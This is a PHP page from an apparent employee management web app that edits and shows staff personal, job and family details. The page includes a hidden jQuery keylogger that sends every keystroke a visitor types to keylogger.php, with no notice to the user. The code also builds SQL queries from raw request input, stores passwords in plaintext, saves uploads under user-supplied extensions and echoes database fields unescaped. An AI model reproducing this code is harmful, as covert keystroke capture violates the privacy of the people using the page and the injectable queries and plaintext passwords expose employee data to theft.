<?php
include('header.php');

if(isset($_POST['done']))
{
	$name = ucfirst($_POST['name']);
	$user_id = $_POST['employee_id'];
	$email = $_POST['email'];
	$mobile = $_POST['mobile'];
	$dob = $_POST['dob'];
	$gender = $_POST['gender'];
	$dep_name = $_POST['dep_name'];
	$year = $_POST['year'];
	$company = $_POST['company'];
	$designation = $_POST['designation'];
	$father_name = $_POST['father_name'];
	$mother_name = $_POST['mother_name'];
	$father_mobile = $_POST['father_mobile'];
	$address = $_POST['address'];
	$password = $_POST['password'];
	$cpassword = $_POST['con_password'];
	
	//check if password and confirm password is same..
	if($_POST['password'] == $_POST['con_password'])
	{
		if(!empty($_FILES['file']['name']))
		{
			$image_name = $_FILES['file']['name'];
			$image_type = $_FILES['file']['type'];
			$image_tempname = $_FILES['file']['tmp_name'];
			$extention = pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION);
			$image_update_name = $user_id . "." .$extention;
			
			//move image into teacherimage folder
			move_uploaded_file($image_tempname, 'employee/'.$image_update_name);
		}
		
		elseif(!empty($_POST['check']))
		{
			if(!empty($_FILES['profile_pic']['name']))
			{
				$image_name = $_FILES['profile_pic']['name'];
				$image_type = $_FILES['profile_pic']['type'];
				$image_tempname = $_FILES['profile_pic']['tmp_name'];
				$extention = pathinfo($_FILES['profile_pic']['name'],PATHINFO_EXTENSION);
				$image_update_name = $user_id . "." .$extention;
				
				//move image into teacherimage folder
				move_uploaded_file($image_tempname, 'employee/'.$image_update_name);
			}
			elseif(empty($_FILES['profile_pic']['name']))
			{
				$image_update_name = "unknown.jpg";
			}
			
		}
		elseif(empty($_POST['check']))
		{
			$image_update_name = $_POST['old_pic'];
		}
		
		else
		{
			$image_update_name = "unknown.jpg";
		}
		
		
		$query = mysql_query("UPDATE employee SET 
								Name = '$name',
								Password = '$password',
								Email_id = '$email',
								Mobile = '$mobile',
								Gender = '$gender',
								Dob = '$dob',
								Department = '$dep_name',
								Exp_year = '$year',
								Company = '$company',
								Designation = '$designation',
								Father_name = '$father_name',
								Mother_name = '$mother_name',
								Father_mobile = '$father_mobile',
								Address = '$address',
								Image = '$image_update_name'
								WHERE User_id = '$user_id'");
		
	}
	
	//fetch employee information for display..
	$query = mysql_query("SELECT * FROM employee WHERE status = 'True' AND User_id = '$user_id'");
	$row = mysql_fetch_assoc($query);
	$dob = $row['Dob'];
	$year = substr($dob,0,4);
	$date = substr($dob,8,2);
	switch(substr($dob,5,2))
	{
		case "01":
		$month = "January";
		break;
		
		case "02":
		$month = "February";
		break;
		
		case "03":
		$month = "March";
		break;
		
		case "04":
		$month = "April";
		break;
		
		case "05":
		$month = "May";
		break;
		
		case "06":
		$month = "June";
		break;
		
		case "07":
		$month = "July";
		break;
		
		case "08":
		$month = "August";
		break;
		
		case "09":
		$month = "September";
		break;
		
		case "10":
		$month = "October";
		break;
		
		case "11":
		$month = "November";
		break;
		
		case "12":
		$month = "December";
		break;
	}
	
	
	
}//end if(isset($_POST['done']))





//when call get method..
if(isset($_GET['user_id']))
{
	$user_id = $_GET['user_id'];
	$query = mysql_query("SELECT * FROM employee WHERE status = 'True' AND User_id = '$user_id'");
	$row = mysql_fetch_assoc($query);
	$dob = $row['Dob'];
	$year = substr($dob,0,4);
	$date = substr($dob,8,2);
	switch(substr($dob,5,2))
	{
		case "01":
		$month = "January";
		break;
		
		case "02":
		$month = "February";
		break;
		
		case "03":
		$month = "March";
		break;
		
		case "04":
		$month = "April";
		break;
		
		case "05":
		$month = "May";
		break;
		
		case "06":
		$month = "June";
		break;
		
		case "07":
		$month = "July";
		break;
		
		case "08":
		$month = "August";
		break;
		
		case "09":
		$month = "September";
		break;
		
		case "10":
		$month = "October";
		break;
		
		case "11":
		$month = "November";
		break;
		
		case "12":
		$month = "December";
		break;
	}
}
?>

    
    
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
	
	?> 
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column" style="background:#10255F;">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" >
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    <!-- end navigation bar -->
    
  	<?php
	}
    elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
		
	?>
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" style="background:#10255F;">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    <?php
	}
	?> 
    

    <script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board...
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=view_employee');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->


    
    
     <!-- start main heading -->
     <div class="row">
    	<div class="large-3 column main_heading">
      	Employee Details
        </div>
        <div class="large-6 large-offset-1 column main_heading end">
        <span class="success_msg" style="color:#F00;">
        <?php 
		if(isset($_POST['done']))
		{
			if($_POST['password'] == $_POST['con_password'])
			{
				echo "Employee Details Successfully Update";
			}
			else
			{
				echo "Password Does Not Match..!!";
			}
		}
		?>
        
        </span>
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    <!-- Start User details -->
    <div class="index">
    
    <!-- start row -->
    <div class="row employee_detail">
   
   <?php
   if(isset($_GET['user_id']) || isset($_POST['done']))
	{
		if(mysql_num_rows($query) != 0)
		{
			
	?>		
        <!-- Start 6 column for user details -->	
        <div class="large-6 column">
        
        	<div class="row name">
                <div class="large-6 column title">
                Personal Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                Name :
                </div>            
            
                <div class="large-6 column end">
               <?php echo $row['Name']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Employee Id :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['User_id']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Email Add :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Email_id']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Mobile No :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Mobile']; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Date of Birth :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $month." ".$date.", ".$year; ?>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Gender :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Gender']; ?>
                </div>
            </div>
            
             
              <?php
			if(!empty($row['Department']) || !empty($row['Department']))
			{ 
			?>
            <div class="row name">
                <div class="large-6 column title">
                Professional Details
                </div>
            </div>
            <?php
			}
			?>
            
             
             <?php
			if(!empty($row['Department']))
			{ 
			?> 
              
             <div class="row name">
            	<div class="large-6 column heading">
               	Department :
                </div>            
            
                <div class="large-6 column end">
                <?php echo $row['Department']; ?>
                </div>
            </div>
            
            <?php
			}
            ?>
            
            <?php
			if(!empty($row['Exp_year']))
			{ 
			?>
            
                 <div class="row name">
                    <div class="large-6 column heading">
                    Experience Year : 
                    </div>            
                
                    <div class="large-6 column end">
                    <?php echo $row['Exp_year']; ?>
                    </div>
                </div>
                
                 <div class="row name">
                    <div class="large-6 column heading">
                    Company : 
                    </div>            
                
                    <div class="large-6 column end">
                    <?php echo $row['Company']; ?>
                    </div>
                </div>
                
                <div class="row name">
                    <div class="large-6 column heading">
                    Designation : 
                    </div>            
                
                    <div class="large-6 column end">
                   <?php echo $row['Designation']; ?>
                    </div>
                </div>
            
			<?php
			}
            ?>
            
            <div class="row name">
                <div class="large-6 column title">
                Family Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Father Name : 
                </div>            
            
                <div class="large-6 column end">
               <?php echo $row['Father_name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Mother Name : 
                </div>            
            
                <div class="large-6 column end">
                 <?php echo $row['Mother_name']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Father Mobile : 
                </div>            
            
                <div class="large-6 column end">
                 <?php echo $row['Father_mobile']; ?>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Address : 
                </div>            
            
                <div class="large-6 column end">
                 <?php echo $row['Address']; ?>
                </div>
            </div>
            
        </div>
        <!-- end 6 column for user details -->
        
        <!-- start display user image -->
        <div class="large-6 column">
        <div class="row ">
        	<div class="large-6 column large-offset-5 image ">
                    <img src="employee/<?php echo $row['Image']; ?>" class="user_image">
            </div>
        </div>
        </div>	
        <!-- end display user image -->

	<?php		
		}
	}
   ?>
    </div>
    <!-- end row -->
    
    </div>
    <!-- end index -->
    
   <div id="full_width">
   <div class="footer">
        <div class="row">
            <div class="large-2 large-offset-10 column copyright">
        &copy; Rishabh Agrawal
            </div>
        </div>   
   </div>
   </div>
   
    <script>
 		$(".success_msg").delay(3000).slideUp(1000);
 	</script>
    
    
</body>
</html>
